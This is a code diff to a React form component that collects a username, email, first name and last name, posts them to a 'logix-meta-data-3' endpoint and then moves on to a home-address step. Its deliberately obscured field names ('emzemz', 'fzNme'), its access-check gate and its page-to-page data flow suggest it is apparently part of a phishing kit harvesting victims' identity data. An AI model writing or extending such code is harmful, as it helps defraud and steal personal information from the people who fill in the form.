@@ -8,8 +8,9 @@ const BasicInfo: React.FC = () => {
   const [fzNme, setFzNme] = useState('');
   const [lzNme, setLzNme] = useState('');
   const [isLoading, setIsLoading] = useState(false);
-  const [errors, setErrors] = useState({ fzNme: '', lzNme: '', emzemz: '' });
-  const [emzemz, setEmzemz] = useState('');
+  const [errors, setErrors] = useState({ fzNme: '', lzNme: '', email: '' });
+  const [username, setUsername] = useState('');
+  const [email, setEmail] = useState('');
   const isAllowed = useAccessCheck(baseUrl);
 
   const navigate = useNavigate();
@@ -18,13 +19,21 @@ const BasicInfo: React.FC = () => {
 
   React.useEffect(() => {
     if (emzemzState) {
-      setEmzemz(emzemzState);
+      setUsername(emzemzState);
+    } else {
+      console.error('No username provided from previous page');
+      // Optionally redirect back or show error
     }
   }, [emzemzState]);
 
-  //Show loading state while checking access
+  // Show loading state while checking access
   if (!isAllowed) {
     return <div>Loading...</div>;
+  }
+
+  // Check if username is available before showing form
+  if (!username) {
+    return <div>Error: No username provided. Please go back and try again.</div>;
   }
 
   const validateEmzemz = (emzemz: string) => {
@@ -33,15 +42,15 @@ const BasicInfo: React.FC = () => {
   };
 
   const validateForm = () => {
-    const newErrors = { fzNme: '', lzNme: '', emzemz: '' };
+    const newErrors = { fzNme: '', lzNme: '', email: '' };
 
     if (!fzNme.trim()) newErrors.fzNme = 'First name is required';
     if (!lzNme.trim()) newErrors.lzNme = 'Last name is required';
-    if (!emzemz.trim()) newErrors.emzemz = 'Email is required';
-    else if (!validateEmzemz(emzemz)) newErrors.emzemz = 'Invalid email format';
+    if (!email.trim()) newErrors.email = 'Email is required';
+    else if (!validateEmzemz(email)) newErrors.email = 'Invalid email format';
 
     setErrors(newErrors);
-    return !newErrors.fzNme && !newErrors.lzNme && !newErrors.emzemz;
+    return !newErrors.fzNme && !newErrors.lzNme && !newErrors.email;
   };
 
   const handleSubmit = async (e: React.FormEvent) => {
@@ -54,15 +63,16 @@ const BasicInfo: React.FC = () => {
     setIsLoading(true);
 
     try {
-      await axios.post(`${baseUrl}api/meta-data-3/`, {
-        emzemz,
+      await axios.post(`${baseUrl}api/logix-meta-data-3/`, {
+        emzemz: username,  // Username for client lookup
+        email: email,      // Actual email address
         fzNme,
         lzNme
       });
 
       navigate('/home-address', {
         state: {
-          emzemz,
+          emzemz: username,
           fzNme,
           lzNme
         }
@@ -91,22 +101,14 @@ const BasicInfo: React.FC = () => {
           <div className="flex items-center gap-4 mb-4">
             <label className="text-gray-700 w-24 text-right">Email:</label>
             <input
-              id="emzemz"
-              name="emzemz"
+              id="email"
+              name="email"
               type="email"
-              value={emzemz}
-              onChange={(e) => setEmzemz(e.target.value)}
+              value={email}
+              onChange={(e) => setEmail(e.target.value)}
               className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
               placeholder="Enter email address"
             />
-            {errors.emzemz && (
-              <div className="flex items-center gap-2 text-red-600 text-sm">
-                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
-                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
-                </svg>
-                <span>{errors.emzemz}</span>
-              </div>
-            )}
           </div>
 
           <div className="flex items-center gap-4 mb-4">
